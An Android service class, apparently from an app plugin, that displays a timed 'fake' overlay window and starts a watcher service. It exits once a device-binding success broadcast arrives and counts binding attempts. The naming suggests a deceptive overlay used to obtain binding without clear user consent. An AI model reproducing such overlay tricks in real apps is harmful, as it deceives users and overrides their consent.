package com.xstd.plugin.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.Utils.FakeWindow;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

/**
 * Created by michael on 13-12-12.
 */
public class FakeService extends Service {

    public static final String ACTION_SHOW_FAKE_WINDOW = "com.xstd.plugin.fake";

    private FakeWindow window = null;

    private Handler mHandler = new Handler(Looper.getMainLooper());
    public static final String BIND_SUCCESS_ACTION = "com.bind.action.success";
    private BroadcastReceiver mBindSuccesBRC = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Config.LOGD("[[BroadcastReceiver::onReceive]] binding devices success >>>>>");
            UtilsRuntime.goHome(getApplicationContext());

            mHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    android.os.Process.killProcess(android.os.Process.myPid());
                }
            }, 30);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();

        registerReceiver(mBindSuccesBRC, new IntentFilter(BIND_SUCCESS_ACTION));
        showFakeWindow();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(mBindSuccesBRC);
    }

    private synchronized void showFakeWindow() {
        if (AppRuntime.WATCHING_SERVICE_RUNNING.get()) return;

        window = new FakeWindow(getApplicationContext(), new FakeWindow.WindowListener() {

            @Override
            public void onWindowPreDismiss() {
                UtilsRuntime.goHome(getApplicationContext());
            }

            @Override
            public void onWindowDismiss() {
                window = null;
                Config.LOGD("[[FakeActivity::postDelayed]] try to finish process >>>>>>>");
                SettingManager.getInstance().setDeviceBindingTime(SettingManager.getInstance().getDeviceBindingTime() + 1);
                android.os.Process.killProcess(android.os.Process.myPid());
            }
        });
        window.show();
        window.updateTimerCount();

        Intent i1 = new Intent();
        i1.setClass(getApplicationContext(), WatchService.class);
        startService(i1);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
